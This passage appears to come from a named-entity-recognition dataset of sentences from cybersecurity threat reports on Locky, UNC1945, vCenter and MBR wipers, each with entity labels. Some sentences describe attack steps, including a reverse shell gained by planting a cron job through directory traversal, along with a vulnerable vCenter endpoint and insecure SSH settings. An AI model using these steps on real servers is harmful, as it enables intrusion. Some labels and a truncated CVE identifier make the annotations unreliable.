{"entities": []}], ["This blog examines how th is vulnera bility can be exploited in the unpatched vCenter Server 7.0.", {"entities": [[93, 96, "Version_Tag"]]}], ["This blog explains how this malware works.", {"entities": []}], ["This campaign suggests the attackers may plan a future heist against these targets by using Bankshot to gather information.", {"entities": [[92, 100, "Malware_Name"]]}], ["This facilitated user access to the system with a secret hard-coded password and allowed the threat actors to escalate privileges and maintain persistence (see Figure 1).", {"entities": []}], ["This feature can be used for adding encryption to legacy applications traversing firewalls or with malicious intent to access internal networks from the the internet.", {"entities": []}], ["This implant also contains functionality to wipe files and content from the targeted system to erase evidence or perform other destructive actions.", {"entities": []}], ["This indicates a dwell time of approximately 519 days based on recovered artifacts.", {"entities": []}], ["This is a very basic common way of testing if the application developers did proper input sanitation check to prevent attackers inserting code or generating failures that could reveal data about the application and can give clues to compromise the system.", {"entities": []}], ["This is especially true for this week, as we are seeing more Locky-related spam themes than Dridex.", {"entities": [[28, 37, "DATE"], [61, 66, "Malware_Name"], [92, 98, "Campaign"]]}], ["This library provides several utility classes and functions to rapidly develop scripts to automate debugging tasks within Windbg.", {"entities": []}], ["This links the previous samples with this unique username.", {"entities": []}], ["This looks like a specific beacon to indicate that the malware is ready to receive commands.", {"entities": []}], ["This newer variant simply overwrites the MBR with zeroes.", {"entities": []}], ["This particular strain of spam e-mails contain no links, but they do include a phone number that the victim is asked to call if they want to change or cancel the order.", {"entities": []}], ["This post extends the FireEye Labs", {"entities": []}], ["This post was prepared with contributions from Asheer Malhotra, Charles Crawford, and Jessica Saavedra-Morales.", {"entities": [[47, 62, "PERSON"], [64, 80, "PERSON"], [86, 110, "PERSON"]]}], ["This process only takes a few minutes at minimum, but the more time you spend training, the better the experience you will have with it.", {"entities": [[24, 37, "TIME"]]}], ["This sample contains a domain name generation algorithm that is based on the current month, day and year.", {"entities": []}], ["This server was running Apache 2.4.9, which is publicly known to contain nine vulnerabilities.", {"entities": []}], ["This suggests that the cybercriminals are earning more from ransomware and this drives their aggressive campaigns.", {"entities": [[60, 70, "Malware_Type"]]}], ["This time, however, this attacker uses a COVID pandemic that has not yet happened as bait.", {"entities": []}], ["This time, luck was on the victim's side as the malware did not touch any user data, but the user may not be so lucky next time.", {"entities": []}], ["Those who have successfully gained access to medical data have been well rewarded for their efforts.", {"entities": []}], ["Through Mandiant investigation of intrusions, the FLARE Advanced Practices team observed a group we track as UNC1945 compromise managed service providers and operate against a tailored set of targets within the financial and professional consulting industries by leveraging access to third-party networks (see this blog post for an in-depth description of “UNC” groups).", {"entities": [[8, 16, "ORG"], [109, 116, "Threat_Actor"]]}], ["Tiny Core Linux pre-loaded tools included Mimikatz, Powersploit, Responder, Procdump, CrackMapExec, PoshC2, Medusa, JBoss Vulnerability Scanner and more.", {"entities": []}], ["To determine how many PACS servers are connected depends on on how you search using Shodan, a search engine for finding specific types of computers connected to the Internet.", {"entities": []}], ["To mask itself, it can run as a regular library loaded into a legitimate process.", {"entities": []}], ["To use VoiceAttack, you must first train Windows Speech Recognition to recognize your voice.", {"entities": [[7, 18, "Software_Name"], [41, 48, "Operating_System"]]}], ["Today, we are sharing something quite unusual.", {"entities": []}], ["Two Flash files exploit CVE-2018-4878.", {"entities": [[24, 37, "Vulnerability"]]}], ["UNC1945 Attack Lifecycle", {"entities": [[0, 7, "Threat_Actor"]]}], ["UNC1945 demonstrated access to exploits, tools and malware for multiple operating systems, a disciplined interest in covering or manipulating their activity, and displayed advanced technical abilities during interactive operations.", {"entities": [[0, 7, "Threat_Actor"]]}], ["UNC1945 employed anti-forensics techniques with the use of a custom ELF utility named LOGBLEACH.", {"entities": [[0, 7, "Threat_Actor"]]}], ["UNC1945 targeted Oracle Solaris operating systems, utilized several tools and utilities against Windows and Linux operating systems, loaded and operated custom virtual machines, and employed techniques to evade detection.", {"entities": [[0, 7, "Threat_Actor"], [17, 31, "ORG"], [96, 103, "Operating_System"], [108, 113, "Operating_System"]]}], ["Unfortunately, due to insufficient available evidence, the next indication of activity was in mid-2020 at which time a different Solaris server was observed connecting to the threat actor infrastructure.", {"entities": [[94, 102, "DATE"]]}], ["Unfortunately, library call emulation is required, and emulating every library call is difficult and may cause inaccurate results.", {"entities": []}], ["Urgent Invoice Campaign Figure 5.", {"entities": []}], ["V M ware has confirmed that this vulnerability is being actively exploited in the wild and CVE-2021-2205 has been assigned to it.", {"entities": [[91, 104, "Vulnerability"]]}], ["VCNTR-ANALYTCS-AFU", {"entities": []}], ["VMware CEIP First, we determined how this telemetry data is collected and stored by VMware server.", {"entities": [[0, 6, "ORG"]]}], ["VMware vCenter server is a centralised management utility used for managing multiple ESXi hosts, virtual machines and all their dependent components.", {"entities": [[0, 6, "ORG"]]}], ["Vishing is no different.", {"entities": [[0, 7, "Attack_Type"]]}], ["Vivisect contains several heuristics for identifying functions and cross-references.", {"entities": []}], ["Voice attack is an inexpensive software application that utilizes the Windows Speech Recognition (WSR) feature to enable the creation of user-defined, voice-activated macros.", {"entities": [[0, 12, "Software_Name"]]}], ["Voice commands in the profile enable the user to easily click the OK or Cancel buttons, toggle checkboxes, and tab through controls in the dialog in both directions and in specified increments.", {"entities": []}], ["VoiceAttack requires an internet connection, but only during the registration process, after which the network adapter can be disabled or configured to a network that cannot reach the internet without issue.", {"entities": [[0, 11, "Software_Name"]]}], ["Vulnerabilities In addition to expensive commercial PACS systems, open-source or small-fee PACS are available for small health care institutions or practices.", {"entities": []}], ["Vulnerability Details In our lab, we have locally setup vCenter 7.0 build 17920168 to test the attack scenario.", {"entities": [[64, 67, "Version_Tag"]]}], ["We begin by starting the process with Windbg and executing until the program’s entry point.", {"entities": []}], ["We can see that a service called vmware -analytics is running over tcp port 15080 :", {"entities": [[67, 70, "Protocol"]]}], ["We discovered two more documents, written in Korean, that exploit the same vulnerability as Agreement.docx.", {"entities": [[45, 51, "NORP"]]}], ["We found more problems: Unencrypted traffic between client and server Click jacking Cross-site scripting (reflected) Cross-site scripting stored as cross-site request forgery Document object model–based link manipulation Remote creation of admin accounts", {"entities": []}], ["We have reported the vulnerabilities we discovered to these vendors following our responsible disclosure process.", {"entities": []}], ["We then allocate 0x3A-bytes of memory for the output string.", {"entities": []}], ["We then need to run the function and read out the result.", {"entities": []}], ["We use the newly allocated memory as the second parameter and setup the remainder of the arguments.", {"entities": []}], ["We use the third parameter, the length, to specify the size of the memory allocation.", {"entities": []}], ["We will discuss this vulnerability in greater detail in a follow up blog post.", {"entities": []}], ["Well dream no more!", {"entities": []}], ["Well, now you can simply say “show opcodes” or “hide opcodes” and it will be so!", {"entities": []}], ["What Does the IDA Pro Profile Provide?", {"entities": []}], ["What does this mean?", {"entities": []}], ["What happens if you call?", {"entities": []}], ["When communicating with the DICOM (digital imaging and communications in medicine) port, TCP 104, it is possible to grab the banner of a server and get a response.", {"entities": []}], ["When developing this profile, I was shocked to discover just how many keyboard shortcuts there really are for IDA Pro and what can be accomplished with them.", {"entities": []}], ["While at a doctor’s appointment with my wife watching a beautiful 4D ultrasound of our unborn child, I noticed the words “saving data to image” flash on the screen.", {"entities": []}], ["While containing many of the features of \\\"joke\\\" malware, it is also destructive, causing infected machines to fail to boot.", {"entities": []}], ["While the malware itself is not sophisticated, it does take several actions designed to put fear into the victim before inducing true panic.", {"entities": []}], ["While the old variant masquerades as an Android settings application, the new version presents itself as “Gplay Dsc” to the user.", {"entities": []}], ["While the result is almost identical to another MBR wiper that Sonicwall posted a blog about in April 2020, our analysis did not show any resemblance in their wiper codes.", {"entities": [[63, 72, "ORG"], [96, 106, "DATE"]]}], ["While this is true and an important goal for the profile, it is not practical for people who have full use of their hands to go completely hands-free.", {"entities": []}], ["While we don't know how exactly the malware was distributed, the malware author has tried to weaponize fear as bait to lure victims into opening the file.", {"entities": []}], ["With FLARE’s new profile for VoiceAttack , users can completely control IDA Pro with their voice!", {"entities": [[5, 12, "ORG"], [29, 40, "Software_Name"]]}], ["With the aid of a companion IDAPython plugin , additional navigation commands are supported.", {"entities": []}], ["With this profile, I can simply say “show strings” or “show structures” or “show window x” to change the tab I am currently viewing or open a new view in a tab without having to move my mouse cursor anywhere.", {"entities": []}], ["Without using IDA, a handy Python project for binary analysis is Vivisect .", {"entities": []}], ["You can even have the computer speak to you in response to your commands!", {"entities": []}], ["You will also want to create recovery media beforehand, or else you will need to use a working machine, which can be difficult for home users after the damage is done.", {"entities": []}], ["Zipped Content In Figure 7, it is interesting to see that the recent Locky campaign seems to prefer using a JavaScript-based downloader in comparison to Microsoft Word and Excel macro-based downloaders, which were seen being used in its early days.", {"entities": []}], ["[1], where the victim was reportedly forced to pay a ransom to retrieve their encrypted data.", {"entities": []}], ["[CoronaPopup.exe] 80C9F65617386940153CC4D42E1097DEB79B4F9C98C67E6025BDC1CA03AD8FB7 [icons.exe] 496CABBD18530780A3CB75340BDDD7F74A71E84C83DF4D185CFC6EC71D14C41E [WipeMBR.exe] 5FC9080177A096DE2B717F2F2196867B6966900E129E5BC4E412D5DCA7ED9E60 [final.vbs] EA2EF4196586BF851D4DC422A04D51AD2CB552BF5AAE2DF361D1ED2D4842B4BA", {"entities": [[1, 16, "Filename"], [84, 93, "Filename"], [161, 172, "Filename"]]}], ["[ID 366847 auth.notice] ‘su root’ - succeeded for netcool on /dev/pts/31 Figure 1:", {"entities": []}], ["[audit_type: USER_END] user pid=10080 uid=0", {"entities": []}], ["[caption id=\\\"attachment_5078\\\"", {"entities": []}], ["[caption id=\\\"attachment_5079\\\" align=\\\"aligncenter\\\" width=\\\"640\\\"] Figure 3 - Decrypted CnC Communication containing stolen SMS[/caption]", {"entities": []}], ["[caption id=\\\"attachment_5080\\\" align=\\\"aligncenter\\\" width=\\\"621\\\"] Figure 1 - New Infection Registration[/caption] Figure 2 and Figure 3 show the SMS exfiltration mechanism, as seen in Figure 1, the first four bytes of the encrypted payload contains the length indicator of the payload.", {"entities": []}], ["[caption id=\\\"attachment_5081\\\" align=\\\"aligncenter\\\" width=\\\"349\\\"] Figure 4 - CnC serving an webpage[/caption]", {"entities": []}], ["[lol.vbs] C88D3022B25EF86CD19CE99815AD26A1F9A201F69974577DA93E08328E047410", {"entities": []}], ["[noescapez.vbs] 3D519FC10BC2B6CAA5A27069DA55B1614CC97C1DFD4BCDC1DD7F36E686D913F1 [x.vbs] E22F004CF9E7C4C7B52BDA59DB2B57816992CB01FDBEF6675760FDD7BCD29728 [speakwh.vbs] 4624876389F6DDFB111FBBF3473D7C6B5555ED8A0F31C37E822A6FFEF5E27DE0 [Covid22Server.exe] 0C6DFAA12A98FB17058B79D283E96A3E34549D0AD2BE58F505AC8ABDE858D8A6 Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio .", {"entities": [[234, 251, "Filename"], [335, 345, "ORG"], [346, 361, "ORG"]]}], ["align=\\\"aligncenter\\\" width=\\\"640\\\"] Figure 2 - Encrypted", {"entities": []}], ["auid=0 msg='PAM: session close acct=root\\\" : exe=\\\"/usr/sbin/sshd\\\" (hostname=1.239.171.32, addr=1.239.171.32, terminal=ssh res=success)'\\\" FileItem:", {"entities": []}], ["because it lacks ServiceMain().", {"entities": []}], ["by directory traversal R emote C ode E xecution To achieve remote code execution and obtain a reverse shell, the following steps can be taken: On the victim’s server, create a cron job at “ /etc/cron.d/” using directory traversal.", {"entities": []}], ["completed is set to 1.", {"entities": []}], ["config1 config2", {"entities": []}], ["deploy", {"entities": []}], ["digits>.locky The <system identifier> value is the ASCII hexadecimal representation of the first eight bytes of the MD5 hash of the GUID of the system volume.", {"entities": []}], ["filename is based on static analysis.", {"entities": []}], ["i >.json", {"entities": []}], ["i< value of parameter _", {"entities": []}], ["id is set to a unique identifier generated for the compromised system.", {"entities": []}], ["no NoHostAuthenticationForLocalhost yes StrictHostKeyChecking no UserKnownHostsFile /dev/null", {"entities": []}], ["no NoHostAuthenticationForLocalhost yes StrictHostKeyChecking no UserKnownHostsFile /dev/null ServerAliveInterval 30", {"entities": []}], ["nscache.prserv.com", {"entities": []}], ["paytext is set to a binary buffer containing the recovery instructions.", {"entities": []}], ["pubkey is set to a binary buffer that contains a public RSA key.", {"entities": []}], ["purchase Other, similar notifications mention the purchase of security software licenses — we’ve seen some referring to Norton and even Kaspersky (although our product lineup has never included a “Kaspersky Total Protection.”)", {"entities": [[120, 126, "ORG"], [136, 145, "ORG"]]}], ["resolver1.qwest.net resolver2.opendns.com google-public-dns-b.google.com google-public-dns-a.google.com mx1.oray.net.cn", {"entities": []}], ["the Further investigation into this campaign and analysis of McAfee product telemetry shows that the infection occurred on March 2 and 3.", {"entities": [[123, 136, "DATE"]]}], ["user_id is a hardcoded value in the malware binary that is sent to the control server.", {"entities": []}], ["vmware-analytics running over port 15080", {"entities": []}], ["      Breakpoints ·      Function calling In addition to the basic debugger utility functions, the DebugUtils class uses Vivisect to handle the binary analysis portion.", {"entities": []}], ["“If you didn’t make this purchase, please call us” We recently detected several waves of spam e-mails, seemingly from reputable companies, notifying recipients of substantial purchases.", {"entities": []}], ["“https://<vCenter-Server-ip>/analytics/telemetry/ph/api/hyper/send?_c&_i=test”", {"entities": []}]]